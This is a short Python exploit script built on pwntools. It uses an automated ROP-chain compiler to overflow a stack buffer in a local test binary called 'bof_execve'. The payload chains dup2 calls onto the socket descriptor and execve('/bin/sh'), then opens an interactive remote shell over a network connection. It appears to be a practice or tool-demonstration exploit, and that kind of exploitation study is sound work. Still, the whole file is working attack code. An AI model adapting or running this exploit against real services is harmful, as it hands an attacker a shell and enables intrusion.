import sys, logging
from pwn import *
from rop_compiler import ropme, goal

filename = './bof_execve'
process([filename,'3000'])

p = remote('localhost', 2222)
#p = process([filename,'3000'])
#gdb.attach(p, "set disassembly-flavor intel")

print "Using automatically built ROP chain"
files = [(filename, None, None)]
goals = [
  ["function", "dup2", 4, 0],
  ["function", "dup2", 4, 1],
  ["function", "dup2", 4, 2],
  ["execve", "/bin/sh"]
]

rop = ropme.rop(files, [], goals, log_level = logging.DEBUG)

payload = 'A'*512 + 'B'*8 + rop
payload += ((700 - len(payload)) * 'B')
payload += "JEFF" # To end our input

with open("/tmp/rop", "w") as f: f.write(rop)
with open("/tmp/payload", "w") as f: f.write(payload)

print 'Calling dup2 and execve in the target'
p.write(payload)
p.interactive()

